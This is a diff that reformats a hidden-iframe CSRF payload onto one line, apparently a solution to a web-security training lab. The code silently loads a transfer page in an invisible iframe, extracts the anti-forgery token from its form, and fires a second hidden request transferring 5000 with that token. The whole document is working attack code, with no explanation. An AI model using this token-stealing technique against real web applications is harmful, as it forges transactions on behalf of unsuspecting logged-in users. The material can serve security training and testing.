@@ -1,12 +1,1 @@
-<iframe src="attack?Screen=1721642316&menu=900&transfer=main" onload="getTokenTransfer()" id="transfer_main" style="width:0;height:0;border:0; border:none;"></iframe>
-<iframe id="make_transfer" style="width:0;height:0;border:0; border:none;"></iframe>
-<script language="javacript">
-    function getTokenTransfer() {
-        var token;
-        var frameDoc = document.getElementById("transfer_main").contentDocument;
-        var form = frameDoc.getElementsByTagName("form")[0];
-        token = '&token=' + form.token.value;
-        var transferFrame = document.getElementById("make_transfer");
-        transferFrame.src= "attack?Screen=1721642316&menu=900&transfer=5000" + token + "#attack/1721642316/900";
-    }
-</script>
+<iframe src="attack?Screen=1721642316&menu=900&transfer=main" onload="getTokenTransfer()" id="transfer_main" style="width:0;height:0;border:0; border:none;"></iframe><iframe id="make_transfer" style="width:0;height:0;border:0; border:none;"></iframe><script language="javacript">function getTokenTransfer() {var token;var frameDoc = document.getElementById("transfer_main").contentDocument;var form = frameDoc.getElementsByTagName("form")[0];token = '&token=' + form.token.value;var transferFrame = document.getElementById("make_transfer");transferFrame.src= "attack?Screen=1721642316&menu=900&transfer=5000" + token + "#attack/1721642316/900";}</script>
